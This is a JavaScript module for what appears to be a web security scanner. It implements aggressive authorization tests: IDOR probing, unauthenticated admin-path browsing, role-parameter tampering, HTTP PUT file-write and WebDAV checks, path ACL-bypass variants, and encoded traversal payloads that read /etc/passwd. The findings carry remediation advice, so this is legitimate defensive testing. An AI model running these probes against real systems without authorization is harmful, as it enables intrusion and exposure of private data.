'use strict';

/**
 * accessControl.js — AGGRESSIVE. Authorization / access-control attacks (checks 36-42).
 * In-band only, bounded, same-origin.
 */

const { URL } = require('url');
const P = require('../probeUtils');
const REF = 'https://owasp.org/www-project-web-security-testing-guide/';

function fire(ctx, f) { ctx.finding({ category: 'Authorization', reference: REF, ...f }); }

// 36. IDOR / horizontal priv-esc — alter numeric/UUID ids in discovered params.
async function idor(ctx) {
  const { log, options } = ctx;
  const cap = options.maxIdor || 15;
  let tested = 0;
  for (const { url, param } of P.paramTargets(ctx, 40)) {
    if (tested >= cap) break;
    if (!/id|user|account|order|invoice|doc|file|num|record|uid|pid/i.test(param)) continue;
    try {
      const u = new URL(url);
      const cur = u.searchParams.get(param);
      if (!/^\d+$/.test(cur || '')) continue;
      tested++;
      const orig = await ctx.http.request(url, { timeout: 8000 });
      const otherVal = String(Math.max(1, parseInt(cur, 10) + 1));
      const other = await ctx.http.request(P.withParam(url, param, otherVal), { timeout: 8000 });
      // Both 200, different content, no auth redirect -> likely IDOR
      if (orig.status === 200 && other.status === 200 &&
          (orig.body || '').length > 50 &&
          Math.abs((orig.body || '').length - (other.body || '').length) > 20 &&
          !/login|sign in|unauthor/i.test(other.body || '')) {
        log('vuln', `IDOR: "${param}" exposes other records by changing the id`);
        fire(ctx, { title: `Insecure Direct Object Reference in "${param}"`, status: 'fail', severity: 'high',
          evidence: `Changing ${param}=${cur} to ${otherVal} returned different content without an authorization check.`,
          remediation: 'Enforce per-object ownership checks server-side; use unguessable, access-checked references.',
          request: { method: 'GET', url: P.withParam(url, param, otherVal), param, payload: `${param}=${otherVal}`, status: other.status } });
        return;
      }
    } catch (e) { log('debug', `idor: ${e.message}`); }
  }
}

// 37. forced browsing (unauthenticated) to sensitive endpoints
async function forcedBrowsing(ctx) {
  const { log } = ctx;
  const origin = new URL(ctx.target);
  const paths = ['/admin', '/admin/', '/dashboard', '/account', '/settings', '/api/users', '/api/admin', '/users', '/config', '/manage'];
  for (const pth of paths) {
    try {
      const r = await ctx.http.request(`${origin.protocol}//${origin.host}${pth}`, {
        method: 'GET', timeout: 8000, followRedirects: false, headers: { Cookie: '' },
      });
      if (r.status === 200 && (r.body || '').length > 200 && !P.SIGS.denial.test(r.body || '') &&
          /admin|dashboard|user|manage|setting|account/i.test(r.body || '')) {
        log('vuln', `Forced browsing: ${pth} returns 200 without authentication`);
        fire(ctx, { title: `Unauthenticated access to ${pth}`, status: 'fail', severity: 'high',
          evidence: `GET ${pth} with no session returned 200 with privileged-looking content.`,
          remediation: 'Require authentication + authorization on every sensitive route (deny by default).',
          request: { method: 'GET', url: `${origin.protocol}//${origin.host}${pth}`, headers: { Cookie: '' }, status: r.status } });
        return;
      }
    } catch (e) { log('debug', `forced: ${e.message}`); }
  }
}

// 38. vertical priv-esc via role/param tampering
async function vertPrivEsc(ctx) {
  const { log } = ctx;
  for (const { url, param } of P.paramTargets(ctx, 15)) {
    try {
      const base = await ctx.http.request(url, { timeout: 8000 });
      const u = new URL(url);
      u.searchParams.set('admin', 'true');
      u.searchParams.set('role', 'admin');
      u.searchParams.set('debug', 'true');
      const tampered = await ctx.http.request(u.toString(), { timeout: 8000 });
      if (tampered.status === 200 && Math.abs((tampered.body || '').length - (base.body || '').length) > 120 &&
          /admin|role|privilege|debug/i.test(tampered.body || '')) {
        log('warn', `Role/param tampering changed response on ${url}`);
        fire(ctx, { title: 'Possible vertical privilege escalation (param tampering)', status: 'warn', severity: 'medium',
          evidence: `Adding admin=true/role=admin/debug=true changed the response materially (heuristic).`,
          remediation: 'Derive privileges from the server-side session, never from request params.',
          request: { method: 'GET', url: u.toString(), payload: 'admin=true&role=admin&debug=true', status: tampered.status } });
        return;
      }
    } catch (e) { log('debug', `vert: ${e.message}`); }
  }
}

// 39. HTTP method tampering / WebDAV
async function methodTampering(ctx) {
  const { log } = ctx;
  const origin = new URL(ctx.target);
  const base = `${origin.protocol}//${origin.host}`;
  const marker = P.marker('put');
  try {
    const put = await ctx.http.request(`${base}/${marker}.txt`, {
      method: 'PUT', timeout: 8000, followRedirects: false, headers: { 'Content-Type': 'text/plain' }, body: marker,
    });
    if (put.status === 200 || put.status === 201 || put.status === 204) {
      const check = await ctx.http.request(`${base}/${marker}.txt`, { timeout: 8000 });
      if ((check.body || '').includes(marker)) {
        log('vuln', 'HTTP PUT method allows arbitrary file upload');
        fire(ctx, { category: 'Configuration Management', title: 'HTTP PUT file upload enabled', status: 'fail', severity: 'critical',
          evidence: `PUT /${marker}.txt succeeded and the file was retrievable — remote file write.`,
          remediation: 'Disable PUT/DELETE/WebDAV methods unless required and properly authorized.',
          request: { method: 'PUT', url: `${base}/${marker}.txt`, headers: { 'Content-Type': 'text/plain' }, body: marker, status: put.status } });
        return;
      }
    }
  } catch (e) { log('debug', `put: ${e.message}`); }
  for (const m of ['DELETE', 'PATCH', 'PROPFIND']) {
    try {
      const r = await ctx.http.request(base + '/', { method: m, timeout: 7000, followRedirects: false });
      // Only a 2xx (or 207 Multi-Status for WebDAV) indicates the method is actually
      // handled; 404/400/405/501 do not mean the method is usable.
      if (r.status >= 200 && r.status < 300) {
        log('warn', `${m} method appears enabled (HTTP ${r.status})`);
        fire(ctx, { category: 'Configuration Management', title: `Risky HTTP method enabled: ${m}`, status: 'warn', severity: 'low',
          evidence: `${m} / returned HTTP ${r.status} (server processed the method).`,
          remediation: `Disable ${m} unless explicitly required and authorized.`,
          request: { method: m, url: base + '/', status: r.status } });
      }
    } catch (e) { /* */ }
  }
}

// 40. path-based ACL bypass
async function pathAclBypass(ctx) {
  const { log } = ctx;
  const origin = new URL(ctx.target);
  const base = `${origin.protocol}//${origin.host}`;
  const admin = await ctx.http.request(base + '/admin', { timeout: 7000, followRedirects: false, headers: { Cookie: '' } }).catch(() => null);
  if (!admin || admin.status === 200) return; // nothing protected to bypass
  const variants = ['/admin/', '/Admin', '/admin/.', '/admin%2f', '/./admin', '/admin/..;/', '/admin?', '/ADMIN'];
  for (const v of variants) {
    try {
      const r = await ctx.http.request(base + v, { timeout: 7000, followRedirects: false, headers: { Cookie: '' } });
      if (r.status === 200 && (r.body || '').length > 200 && !P.SIGS.denial.test(r.body || '')) {
        log('vuln', `Path ACL bypass: ${v} reached protected content (base /admin was ${admin.status})`);
        fire(ctx, { title: `Access-control bypass via path variant: ${v}`, status: 'fail', severity: 'high',
          evidence: `/admin returned ${admin.status} but ${v} returned 200 unauthenticated.`,
          remediation: 'Normalize/canonicalize paths before authorization; deny by default.',
          request: { method: 'GET', url: base + v, headers: { Cookie: '' }, payload: v, status: r.status } });
        return;
      }
    } catch (e) { /* */ }
  }
}

// 41. deep traversal (multi-encoding)
async function deepTraversal(ctx) {
  const { log } = ctx;
  const payloads = [
    '....//....//....//etc/passwd',
    '%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd',
    '..%252f..%252f..%252fetc%252fpasswd',
    '/%2e%2e/%2e%2e/%2e%2e/etc/passwd',
    '..%c0%af..%c0%af..%c0%afetc/passwd',
  ];
  for (const { url, param } of P.paramTargets(ctx, 12)) {
    if (!/file|path|page|doc|template|include|load|read|dir|download/i.test(param)) continue;
    for (const pl of payloads) {
      try {
        const r = await ctx.http.request(P.withParam(url, param, pl), { timeout: 8000 });
        if (P.SIGS.passwd.test(r.body || '')) {
          log('vuln', `Deep traversal: "${param}" with encoded payload read /etc/passwd`);
          fire(ctx, { category: 'Data Validation', title: `Path Traversal (encoded) in "${param}"`, status: 'fail', severity: 'critical',
            evidence: `Encoded traversal payload returned /etc/passwd via ${param}.`,
            remediation: 'Canonicalize and allowlist paths after decoding; never use raw input in file access.',
            request: { method: 'GET', url: P.withParam(url, param, pl), param, payload: pl, status: r.status } });
          return;
        }
      } catch (e) { /* */ }
    }
  }
}

// 42. CORS credentialed exploitation
async function corsCreds(ctx) {
  const { log } = ctx;
  for (const origin of ['null', 'https://evil.smartscan.example']) {
    try {
      const r = await ctx.http.request(ctx.target, { timeout: 8000, headers: { Origin: origin } });
      const acao = r.headers['access-control-allow-origin'];
      const acac = String(r.headers['access-control-allow-credentials']).toLowerCase() === 'true';
      if ((acao === origin || acao === 'null') && acac) {
        log('vuln', `CORS reflects Origin ${origin} with credentials`);
        fire(ctx, { category: 'HTML 5', title: 'CORS credentialed exploitation', status: 'fail', severity: 'high',
          evidence: `ACAO reflected "${origin}" with Access-Control-Allow-Credentials: true.`,
          remediation: 'Never reflect arbitrary/null origins with credentials; use a strict allowlist.',
          request: { method: 'GET', url: ctx.target, headers: { Origin: origin }, payload: `Origin: ${origin}`, status: r.status } });
        return;
      }
    } catch (e) { /* */ }
  }
}

async function run(ctx) {
  if (ctx.options.intensity !== 'aggressive') {
    ctx.log('debug', 'Access Control attacks skipped (requires Aggressive intensity).');
    return;
  }
  ctx.log('info', 'Access control: IDOR, forced browsing, privilege escalation, method tampering, path bypass, deep traversal, CORS...');
  const steps = [
    ['IDOR', idor], ['forced browsing', forcedBrowsing], ['vertical priv-esc', vertPrivEsc],
    ['method tampering', methodTampering], ['path ACL bypass', pathAclBypass],
    ['deep traversal', deepTraversal], ['CORS credentials', corsCreds],
  ];
  for (const [name, fn] of steps) {
    ctx.log('debug', `→ ${name}`);
    try { await fn(ctx); } catch (e) { ctx.log('debug', `${name} error: ${e.message}`); }
  }
}

module.exports = { id: 'accessControl', category: 'Authorization', run };
